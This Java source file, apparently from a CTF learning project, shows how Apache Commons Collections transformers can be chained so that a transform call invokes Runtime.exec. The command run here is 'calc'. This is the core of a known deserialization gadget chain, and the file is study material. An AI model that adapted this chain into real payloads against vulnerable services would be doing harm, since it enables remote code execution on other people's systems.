package com.ctfjava.main;

import com.ctfjava.entity.User;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class TestCC {
    public static void main(String[] args){
        //php的伪协议  接口
        //Transformer transformer;
        //常量转换器，无论输入如何对象返回固定在
        ConstantTransformer constantTransformer=new ConstantTransformer(Runtime.getRuntime());
        Object o=constantTransformer.transform(new User());
        System.out.println(o);  //java.lang.Runtime@45ee12a7
        //反射
        InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        ChainedTransformer chainedTransformer=new ChainedTransformer(new Transformer[]{constantTransformer,invokerTransformer});
        chainedTransformer.transform("ctfjava");
        HashMap hashMap=new HashMap();
        Map transformedMap=TransformedMap.decorate(hashMap,null,new ConstantTransformer("ctfjava"));
        transformedMap.put("123","456");
        System.out.println(transformedMap.get("123"));
    }
}
